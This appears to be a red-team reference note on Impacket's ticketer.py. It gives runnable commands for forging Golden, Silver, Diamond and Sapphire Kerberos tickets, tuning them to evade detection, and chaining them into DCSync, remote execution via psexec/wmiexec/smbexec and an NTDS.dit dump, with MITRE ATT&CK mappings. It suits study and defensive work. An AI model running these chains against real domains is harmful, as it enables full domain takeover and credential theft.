# Impacket — ticketer.py — Hands-On Use Cases

Every scenario below builds on the same core mechanic documented in `01 - Overview.md` — a `.ccache` built either entirely offline (`createBasicTicket()`'s default branch) or from a genuinely KDC-issued template (`-request`), then signed/encrypted with the supplied key and saved to disk. What changes is *which* key was used, *what* the ticket claims to be, and *whether the forging step itself touched a KDC at all*. MITRE ATT&CK IDs are tagged per scenario; where no dedicated sub-technique exists (verified against MITRE ATT&CK's own T1558.001/T1558.002 pages, which do not name Diamond or Sapphire tickets), that's stated explicitly rather than forced.

## Contents
- [Golden Ticket From krbtgt's NTLM Hash](#golden-ticket-from-krbtgts-ntlm-hash)
- [Golden Ticket From krbtgt's AES Key](#golden-ticket-from-krbtgts-aes-key)
- [Silver Ticket Against a File Server SPN](#silver-ticket-against-a-file-server-spn)
- [Silver Ticket From a Keytab File](#silver-ticket-from-a-keytab-file)
- [Cross-Domain Privilege Escalation via Extra SID](#cross-domain-privilege-escalation-via-extra-sid)
- [Matching a Realistic Ticket Lifetime](#matching-a-realistic-ticket-lifetime)
- [Diamond Ticket — Cloning a Real TGT](#diamond-ticket--cloning-a-real-tgt)
- [Diamond-Style Silver Ticket — Cloning a Real TGS](#diamond-style-silver-ticket--cloning-a-real-tgs)
- [Sapphire Ticket — Stealing a Real PAC via S4U2Self+U2U](#sapphire-ticket--stealing-a-real-pac-via-s4u2selfu2u)
- [Legacy PAC Structure for Detection Evasion](#legacy-pac-structure-for-detection-evasion)
- [Chained: secretsdump.py → ticketer.py](#chained-secretsdumppy--ticketerpy)
- [Chained Into psexec.py/wmiexec.py/smbexec.py via -k](#chained-into-psexecpywmiexecpysmbexecpy-via--k)
- [Chained Into secretsdump.py via -k](#chained-into-secretsdumppy-via--k)
- [Cross-Platform Handoff to a Windows Host](#cross-platform-handoff-to-a-windows-host)

---

## Golden Ticket From krbtgt's NTLM Hash

**MITRE ATT&CK:** [T1558.001](https://attack.mitre.org/techniques/T1558/001/) (Steal or Forge Kerberos Tickets: Golden Ticket)

```bash
python3 ticketer.py -nthash aad3b435b51404eeaad3b435b51404ee -domain-sid S-1-5-21-1111111111-2222222222-3333333333 -domain corp.local evil
```
No `-spn` given, so `self.__server == self.__domain` internally and a Golden Ticket (AS_REP-shaped, `service = krbtgt`) is built. `evil` (the positional `target`) need not exist in AD — same 20-minute-rule exploitation as `Mimikatz/kerberos (Golden-Silver Ticket)/02 - Hands-On Use Cases.md`'s equivalent scenario. Default `-user-id 500` and the default group set (513/512/520/518/519) forge Domain Admin-equivalent rights. Saves `evil.ccache` in the current directory — no network activity of any kind.

## Golden Ticket From krbtgt's AES Key

**MITRE ATT&CK:** T1558.001

```bash
python3 ticketer.py -aesKey 8f3a1b2c... -domain-sid S-1-5-21-1111111111-2222222222-3333333333 -domain corp.local evil
```
Functionally identical, but the ticket's encryption type becomes AES128/AES256 (inferred from the supplied key's hex length — 32 chars vs 64) instead of RC4-HMAC. Defeats the RC4-encryption-type detection class documented in `Mimikatz/kerberos (Golden-Silver Ticket)/04 - Target Evidence.md`. Obtaining the AES key specifically (not just the NTLM hash) is the real prerequisite — typically `secretsdump.py -just-dc-user krbtgt` (below), which recovers both key types in one pull.

## Silver Ticket Against a File Server SPN

**MITRE ATT&CK:** [T1558.002](https://attack.mitre.org/techniques/T1558/002/) (Steal or Forge Kerberos Tickets: Silver Ticket)

```bash
python3 ticketer.py -nthash <FILESRV01$'s NTLM hash> -domain-sid S-1-5-21-1111111111-2222222222-3333333333 -domain corp.local -spn cifs/filesrv01.corp.local evil
```
`-nthash` here is the **target computer account's own** machine hash, not krbtgt's — no krbtgt compromise involved at all. `-spn cifs/filesrv01.corp.local` sets `self.__service = 'cifs'` / `self.__server = 'filesrv01.corp.local'` (the `service/host` split happens in `TICKETER.__init__`), producing a TGS_REP-shaped ticket. This ticket never touches a DC at any point in its use — it goes directly to `filesrv01.corp.local` via `AP-REQ`, granting SMB access scoped to that one host only.

## Silver Ticket From a Keytab File

**MITRE ATT&CK:** T1558.002

```bash
python3 ticketer.py -keytab svc-mssql.keytab -domain-sid S-1-5-21-1111111111-2222222222-3333333333 -domain corp.local -spn MSSQLSvc/sql01.corp.local:1433 evil
```
`-keytab` (documented in source as "silver ticket only") reads the service account's key(s) directly from a keytab file — `TICKETER.__init__` calls `loadKeysFromKeytab()` only when `options.spn` is set, confirming this flag has no Golden Ticket use case. Useful when key material was recovered as a keytab rather than a raw hex hash — e.g. from a Linux-integrated service account's own credential store — without needing to separately extract and hex-encode an NTLM/AES value.

## Cross-Domain Privilege Escalation via Extra SID

**MITRE ATT&CK:** T1558.001 — no dedicated ATT&CK sub-technique exists for SID-history injection specifically, same framing as `Mimikatz/kerberos (Golden-Silver Ticket)/02 - Hands-On Use Cases.md`'s equivalent scenario

```bash
python3 ticketer.py -aesKey <child domain's krbtgt AES key> -domain-sid S-1-5-21-1111111111-2222222222-3333333333 -domain child.corp.local -extra-sid S-1-5-21-9999999999-8888888888-7777777777-519 evil
```
Same underlying mechanism as Mimikatz's `/sids` — the forged PAC's SID-history field carries the parent domain's (or a trusted forest's) Enterprise Admins SID (RID `519`) forward. The child domain's own DC copies this SID list into any TGS-REP it issues off this ticket, granting forest-wide reach without ever authenticating to the parent domain directly. **Not re-derived** — full mechanics and the SID-filtering/quarantine mitigation are in the cross-linked note above.

## Matching a Realistic Ticket Lifetime

**MITRE ATT&CK:** T1558.001/T1558.002 (evasion variant of the same forgery)

```bash
python3 ticketer.py -nthash <krbtgt hash> -domain-sid S-1-5-21-1111111111-2222222222-3333333333 -domain corp.local -duration 10 evil
```
`-duration 10` sets a 10-hour lifetime — matching Active Directory's own default `Maximum lifetime for user ticket` policy value — instead of the tool's ~10-year default. Directly defeats the time-anomaly detection class documented in `Mimikatz/kerberos (Golden-Silver Ticket)/04 - Target Evidence.md`/`05 - Detection and Hunting.md`, at the cost of the ticket expiring on a realistic schedule rather than persisting indefinitely.

## Diamond Ticket — Cloning a Real TGT

**MITRE ATT&CK:** T1558.001 — no dedicated ATT&CK sub-technique exists for the "clone-and-modify-a-real-ticket" refinement; treated here as a Golden Ticket variant, consistent with MITRE's own T1558.001 page not distinguishing forging-from-scratch from modifying-a-real-ticket

```bash
python3 ticketer.py -nthash <krbtgt hash> -aesKey <krbtgt AES key> -domain-sid S-1-5-21-1111111111-2222222222-3333333333 -domain corp.local -request -user lowpriv -password 'Summer2026!' evil
```
`-request` makes `ticketer.py` **authenticate for real** as `lowpriv` (a genuine, low-privilege domain account) via `getKerberosTGT()`, obtaining a legitimate TGT — this generates a **real Event 4768** for `lowpriv` on the DC. `ticketer.py` then decrypts that real ticket with the supplied krbtgt key, overwrites only the client-name field with `evil` (or whatever identity the forged ticket should claim, per `createBasicTicket()`'s `-request` branch), and re-signs/re-encrypts. Both `-nthash` and `-aesKey` may be needed simultaneously here (the validation-check exemption for `-request` in `01 - Overview.md` exists specifically for this case) because the *real* template ticket's own encryption type — not the operator's preference — dictates which key is actually used. The resulting ticket inherits the real ticket's timestamps and kvno, making it structurally indistinguishable from a genuine TGT at the field level — the community calls this a **Diamond Ticket**.

## Diamond-Style Silver Ticket — Cloning a Real TGS

**MITRE ATT&CK:** T1558.002

```bash
python3 ticketer.py -nthash <svc-mssql's NTLM hash> -domain-sid S-1-5-21-1111111111-2222222222-3333333333 -domain corp.local -spn MSSQLSvc/sql01.corp.local:1433 -request -user lowpriv -password 'Summer2026!' evil
```
Same `-request` mechanism, but with `-spn` also set — `createBasicTicket()`'s `-request` branch checks `self.__domain == self.__server` and, when false (an SPN was given), follows the TGT fetch with a genuine `getKerberosTGS()` call for that SPN. This generates **both** a real Event 4768 (the initial TGT for `lowpriv`) **and** a real Event 4769 (the TGS for the target SPN) before any forgery is applied — two loggable DC interactions for what will become a Silver Ticket, a materially different footprint from the zero-network default Silver forge above.

## Sapphire Ticket — Stealing a Real PAC via S4U2Self+U2U

**MITRE ATT&CK:** T1558.001 — no dedicated ATT&CK sub-technique; MITRE's Golden Ticket page does not name Sapphire Ticket specifically

```bash
python3 ticketer.py -nthash <krbtgt hash> -aesKey <krbtgt AES key> -domain-sid S-1-5-21-1111111111-2222222222-3333333333 -domain corp.local -request -impersonate da-admin -user-id 500 -user lowpriv -password 'Summer2026!' evil
```
Requires `-request` plus every field the source's own validation block enforces (`01 - Overview.md`): `-aesKey`, `-nthash`, `-domain`, `-user`, `-password`, `-domain-sid`, `-user-id` (unless `-old-pac`). After the real TGT fetch above, `getKerberosS4U2SelfU2U()` sends a **second, genuine** TGS-REQ — `lowpriv` requesting, via S4U2Self, a service ticket to itself "as if" for `da-admin` (`-impersonate`), then requesting that ticket be issued user-to-user (`enc-tkt-in-skey`) so the returned PAC can be decrypted with a key the operator already holds (the TGT session key), rather than the target service's own key. The genuine `da-admin` PAC extracted from that reply is spliced into the final ticket in place of a hand-built one, and `-groups`/`-extra-sid`/`-extra-pac`/`-duration` are all silently ignored (a real PAC and a real lifetime came along for free). This defeats the hand-fabricated-PAC inconsistencies a Diamond Ticket can leave — at the cost of a **second** real, DC-logged TGS-REQ beyond the Diamond Ticket's one.

## Legacy PAC Structure for Detection Evasion

**MITRE ATT&CK:** T1558.001/T1558.002 (evasion variant)

```bash
python3 ticketer.py -nthash <krbtgt hash> -domain-sid S-1-5-21-1111111111-2222222222-3333333333 -domain corp.local -old-pac evil
```
`-old-pac` omits `PAC_ATTRIBUTES_INFO` and `PAC_REQUESTOR` — PAC buffer types added in more recent Windows/Kerberos revisions specifically to make forged-ticket detection easier. A forged ticket built with the older, smaller PAC structure blends with what a legacy/pre-patch environment's PACs already looked like, at the cost of standing out on a fully modern, fully patched domain where every legitimate PAC now includes those buffers by default.

## Chained: secretsdump.py → ticketer.py

**MITRE ATT&CK:** [T1003.006](https://attack.mitre.org/techniques/T1003/006/) (OS Credential Dumping: DCSync) for the key-theft step, T1558.001 for the forge

```bash
python3 secretsdump.py -just-dc-user krbtgt corp.local/lowpriv:'Summer2026!'@dc01.corp.local
# ... krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<ntlm-hash>:::
# ... krbtgt:aes256-cts-hmac-sha1-96:<aes-hash>

python3 ticketer.py -nthash <ntlm-hash from above> -aesKey <aes-hash from above> -domain-sid S-1-5-21-1111111111-2222222222-3333333333 -domain corp.local evil
```
The realistic prerequisite chain this whole tool exists to serve: `secretsdump.py -just-dc-user krbtgt` (`Impacket/secretsdump/02 - Hands-On Use Cases.md`) recovers krbtgt's NTLM **and** AES keys in one narrowly-scoped DRSUAPI pull (the same DCSync-equivalent RPC call `Mimikatz/lsadump (DCSync)/` documents), then `ticketer.py` forges from that output entirely offline. Two Linux-side commands, no interactive DC logon, no filesystem/LSASS touch on the DC at any point.

## Chained Into psexec.py/wmiexec.py/smbexec.py via -k

**MITRE ATT&CK:** T1550.003 ([Use Alternate Authentication Material: Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)) for the ticket handoff, plus whichever technique the target exec tool itself maps to (e.g. [T1021.002](https://attack.mitre.org/techniques/T1021/002/) SMB/Windows Admin Shares for `psexec.py`/`smbexec.py`)

```bash
export KRB5CCNAME=evil.ccache
python3 psexec.py -k -no-pass corp.local/evil@dc01.corp.local
python3 wmiexec.py -k -no-pass corp.local/evil@sql01.corp.local
python3 smbexec.py -k -no-pass corp.local/evil@filesrv01.corp.local
```
The forged `.ccache`, pointed to via `KRB5CCNAME`, is consumed by any Impacket example script's `-k` flag exactly like a legitimately-acquired ticket would be (`-no-pass` suppresses the password prompt since Kerberos auth needs none). This is the other half of the story `03`/`04 - Target Evidence.md` build out: the forging step (above) leaves nothing on any target; the moment one of these tools actually authenticates with the forged ticket, it produces the exact same target-side evidence documented in `Impacket/psexec/04 - Target Evidence.md`, `Impacket/wmiexec/04 - Target Evidence.md`, and `Impacket/smbexec/04 - Target Evidence.md` — just via `AuthenticationPackageName: Kerberos` instead of NTLM.

## Chained Into secretsdump.py via -k

**MITRE ATT&CK:** T1550.003, feeding whichever `secretsdump.py` path is used next (e.g. [T1003.002](https://attack.mitre.org/techniques/T1003/002/) Security Account Manager for Path 1, T1003.006 for Path 2/DRSUAPI)

```bash
export KRB5CCNAME=evil.ccache
python3 secretsdump.py -k -no-pass -just-dc corp.local/evil@dc01.corp.local
```
A forged Golden Ticket authenticates a **second**, follow-on `secretsdump.py -just-dc` run — using the forged identity's (fabricated Domain Admin-equivalent) rights to pull the entire domain's NTDS.dit, rather than the narrowly-scoped `-just-dc-user krbtgt` pull that likely produced the forging key in the first place. This is the "domain-wide persistence pays off" step: one forged ticket, reusable indefinitely (until krbtgt rotation), authenticating arbitrarily many follow-on operations across every already-built Impacket sub-tool in this folder.

## Cross-Platform Handoff to a Windows Host

**MITRE ATT&CK:** T1550.003

```
mimikatz # kerberos::ptc evil.ccache
```
`ticketer.py`'s `.ccache` output is the exact MIT/Heimdal format Mimikatz's `kerberos::ptc` natively imports (`Mimikatz/kerberos (Golden-Silver Ticket)/02 - Hands-On Use Cases.md`'s "Pass-the-Ccache" scenario) — a ticket forged on a Linux pivot host converts and injects directly into a Windows session's LSA ticket cache without any manual format conversion. This is the reverse direction of the same interop primitive: forge on Linux with `ticketer.py`, use from Windows via `kerberos::ptt`/native Kerberos-aware tooling.
